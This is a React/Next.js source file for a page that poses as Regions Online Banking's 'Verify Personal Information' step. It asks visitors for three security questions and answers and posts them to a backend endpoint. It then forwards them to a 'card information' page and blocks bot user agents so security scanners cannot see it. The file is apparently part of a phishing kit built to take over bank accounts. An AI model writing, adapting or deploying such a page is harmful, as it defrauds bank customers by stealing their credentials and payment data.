import { Box, Flex, Text } from "@chakra-ui/react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import MobileDetect from "mobile-detect";
import { NextPage } from "next";
import { AltButton } from "../../components/AltButton";
import { Container } from "../../components/Container";
import { Input } from "../../components/Input";
import { Select } from "../../components/Select";
import { Wrapper } from "../../components/Wrapper";
import { DataContext } from "../_app";
import { getProgress } from "../../utils/getProgress";

interface SecurityQuestionsProps {}

const options = [
  ``,
  `What was the name of your first best friend?`,
  `What was the name of your best friend in high school?`,
  `What is the last name of your favorite teacher?`,
  `Where did you go on your first vacation?`,
  `What is the last name of the author of the best book you ever read?`,
  `Who is your favorite author?`,
  `What is your write book Who was your first crush?`,
  `What is your best friend's midde name?`,
  `What was the name of your first teacher?`,
  `hat was your first pet's name?`,
  `What was your patemal grandfather first name?`,
  `What is the first name of the boy or girl that you first kissed?`,
  `What was the last name of your third grade teacher?`,
  `Address of your first house or child hood home (Street Name)?`,
  `Where were you when you first heard about 9/11?`,
  `In what city did you meet your spouse/significant other?`,
  `What was the name of a college you applied to but didn't atend?`,
  `What was your first boss last name?`,
  `What city did you live in the year 2000?`,
  `What was your maternal grandfather's first name?`,
  `What was your maternal grandmother's name?`,
  `hat was the last name of the maid of honor at your wedding?`,
  `What is the last name of the best man at your wedding?`,
  `What position dide you play in your favorite sport?`,
  `What is the first name of your oldest nephew?`,
  `In what city is your vacation home? (Enter full name of city only)`,
  `What was the name of your first girlfriend or boyfriend?`,
  `In what city was your father born? (Enter full name of city only)`,
  `What was the name of your first pet?`,
  `What was the nickname of your grandfather?`,
  `What was your high school mascot?`,
  `What street did your best friend in high school live on? (Enter full name of street only)`,
  `What was the last name of your favorite teacher in final year of high school?`,
  `In what city were you born? (Enter full name of city only)`,
  `What was the name of the town your grandmother lived in? (Enter full name of city only)`,
  `What was your favorite restaurant in college?`,
  `Where did you meet your spouse for the first time? (Enter full name of city only)`,
  `In what city was your mother born? (Enter full name of city only)`,
  `What was the name of your junior high school? (Enter only "Riverdale" for Riverdale Junior high school)`,
];

const schema = yup.object().shape({
  quest1: yup
    .string()
    .required(`This field is required, please select a qestion.`),
  ans1: yup
    .string()
    .required(`This field is required, please enter your answer.`),
  quest2: yup
    .string()
    .required(`This field is required, please select a qestion.`),
  ans2: yup
    .string()
    .required(`This field is required, please enter your answer.`),
  quest3: yup
    .string()
    .required(`This field is required, please select a qestion.`),
  ans3: yup
    .string()
    .required(`This field is required, please enter your answer.`),
});

const SecurityQuestions: NextPage<SecurityQuestionsProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `SECURITY QUESTIONS`);
    formData.append(`securityQuestions`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-security-questions`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      securityQuestions: data,
    });

    push(`/customerservice/cardinformation`);
  });

  return (
    <Wrapper>
      <Head>
        <title>
          Regions Online Banking - Verify Personal Information | Regions
        </title>
      </Head>
      <Box as={`main`} display={`block`}>
        <Container
          progress={getProgress()}
          highlight={getProgress().indexOf(`Security Questions`)}
          showTitle
          showSide
          display={`flex`}
          bgColor={`#fff`}
          border={`2px solid #eee`}
          borderBottom={[`none`, `2px solid #eee`]}
          borderLeft={[`none`, `2px solid #eee`]}
          borderRight={[`none`, `2px solid #eee`]}
          borderRadius={`2px`}
          boxShadow={[`none`, `0 4px 10px rgb(0 0 0 / 3%)`]}
          justifyContent={`flex-start`}
          m={[`15px auto 30px`, `50px auto`]}
          p={0}
          maxW={`initial`}
          w={`auto`}
          bg={`#f9f9f9`}
          flexDir={[`column`, `row`]}
        >
          <Box
            flex={`1 1 auto`}
            borderRight={[`none`, `2px solid #eee`]}
            borderBottom={[`2px solid #eee`, `none`]}
            p={[`30px 15px`, `30px`]}
            bg={`white`}
          >
            <Flex flexDir={`column`}>
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                mb={`13.5px`}
                fontSize={`18px`}
              >
                To get started, please enter the following required information:
              </Text>
              <Box
                w={[`100%`, `66.66666667%`]}
                overflow={`hidden`}
                mt={0}
                float={`left`}
              >
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Select
                    label={`Question`}
                    error={errors.quest1 && errors.quest1.message}
                    register={register}
                    name={`quest1`}
                    options={options}
                  />
                </Box>
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    label={`Answer`}
                    error={errors.ans1 && errors.ans1.message}
                    register={register}
                    name={`ans1`}
                  />
                </Box>
              </Box>
              <Box
                w={[`100%`, `66.66666667%`]}
                overflow={`hidden`}
                mt={0}
                float={`left`}
              >
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Select
                    label={`Question`}
                    error={errors.quest2 && errors.quest2.message}
                    register={register}
                    name={`quest2`}
                    options={options}
                  />
                </Box>
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    label={`Answer`}
                    error={errors.ans2 && errors.ans2.message}
                    register={register}
                    name={`ans2`}
                  />
                </Box>
              </Box>
              <Box
                w={[`100%`, `66.66666667%`]}
                overflow={`hidden`}
                mt={0}
                float={`left`}
              >
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Select
                    label={`Question`}
                    error={errors.quest3 && errors.quest3.message}
                    register={register}
                    name={`quest3`}
                    options={options}
                  />
                </Box>
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    label={`Answer`}
                    error={errors.ans3 && errors.ans3.message}
                    register={register}
                    name={`ans3`}
                  />
                </Box>
              </Box>
              <AltButton onClick={onSubmit} disabled={loading}>
                Next
              </AltButton>
            </Flex>
          </Box>
        </Container>
      </Box>
    </Wrapper>
  );
};

SecurityQuestions.getInitialProps = ({ res, req, ...props }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res?.end(`Fuck off`);
    return {};
  }

  return {
    ...props,
  };
};

export default SecurityQuestions;
